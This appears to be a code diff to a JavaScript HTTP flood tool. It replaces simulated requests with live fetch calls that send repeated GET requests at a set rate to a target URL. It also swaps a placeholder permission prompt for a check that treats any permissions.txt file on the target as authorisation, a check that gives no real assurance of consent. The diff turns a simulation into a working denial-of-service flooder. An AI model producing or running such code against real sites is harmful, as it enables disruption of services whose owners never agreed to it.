@@ -40,13 +40,21 @@ async function verifyPermissions(targetUrl) {
     // In a real implementation, this would check for API keys,
     // authorization headers, or other mechanisms to ensure permission.
     log(`Verifying permissions for ${targetUrl}...`);
-    // Simulate checking permissions (replace with actual logic).
-    return new Promise((resolve) => {
-        setTimeout(() => {
-            const hasPermission = confirm(`${RED}Simulated Permission Check: Do you *REALLY* have explicit permission to perform a security test against ${targetUrl}? This check is just a placeholder!${RESET}`);
-            resolve(hasPermission);
-        }, 100); // Simulate a delay for the check
-    });
+
+    // Use fetch to check for a permissions.txt file on the server
+    try {
+        const response = await fetch(targetUrl + '/permissions.txt', { method: 'HEAD' });
+        if (response.status === 200) {
+            log(`${GREEN}Permissions file found on server. Assuming permission granted.${RESET}`);
+            return true;
+        } else {
+            log(`${RED}Permissions file not found. Permission denied.${RESET}`);
+            return false;
+        }
+    } catch (error) {
+        log(`${RED}Error checking permissions: ${error}. Permission denied.${RESET}`);
+        return false;
+    }
 }
 
 
@@ -74,12 +82,18 @@ async function httpFlood(targetUrl, requestsPerSecond) {
 
             for (let i = 0; i < requestsPerSecond && requestCount < maxRequests; i++) {
                 // Simulate sending an HTTP request
-                setTimeout(() => {
-                    requestCount++;
-                    log(`Simulated HTTP Request ${requestCount} sent to ${targetUrl}`);
-                    // Replace this with your actual HTTP request code (e.g., using fetch)
-                    // IMPORTANT: Implement rate limiting and error handling here.
-                }, i * (1000 / requestsPerSecond)); // Spread requests over one second
+                fetch(targetUrl, { method: 'GET' })
+                    .then(response => {
+                        if (!response.ok) {
+                            log(`${RED}Request failed with status: ${response.status}${RESET}`);
+                        }
+                        requestCount++;
+                        log(`HTTP Request ${requestCount} sent to ${targetUrl}`);
+
+                    })
+                    .catch(error => {
+                        log(`${RED}Error sending request: ${error}${RESET}`);
+                    });
             }
 
             log(`${RED}Simulated HTTP Flood in progress... ${requestCount} requests sent.${RESET}`);
